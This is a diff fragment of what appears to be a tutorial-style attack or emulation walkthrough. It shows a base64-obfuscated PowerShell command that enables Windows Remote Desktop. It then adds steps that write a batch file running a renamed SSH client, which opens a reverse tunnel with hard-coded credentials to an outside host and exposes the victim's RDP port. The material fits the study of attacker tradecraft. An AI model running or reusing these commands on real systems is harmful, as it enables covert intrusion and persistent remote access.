@@ -127,8 +127,16 @@
       -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LVNlcnZpY2UgLU5hbWUgVGVybVNlcnZpY2UgLVN0YXJ0dXBUeXBlIEF1dG9tYXRpYw0KDQpTdGFydC1TZXJ2aWNlIC1OYW1lIFRlcm1TZXJ2aWNlDQoNClNldC1JdGVtUHJvcGVydHkgLVBhdGggJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlclwnIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAw')) | Invoke-Expression}"
    
 
+   e. run and now let's checkout
+      
+      Get-Service -Name TermService
+
+   ![image](https://github.com/user-attachments/assets/272a554b-5da5-4103-8ec0-18ee4424299e)
 
 
+   f. let's write FXS.bat file to run `ekern.exe` and establish reverse SSH Connection to RDP
+
+      echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l H@ck3r -pw C@n't_D3f3nd_2021-44077 -R 127.0.0.1:49800:192.168.20.145:3389 192.168.1.2
       
 ------
 
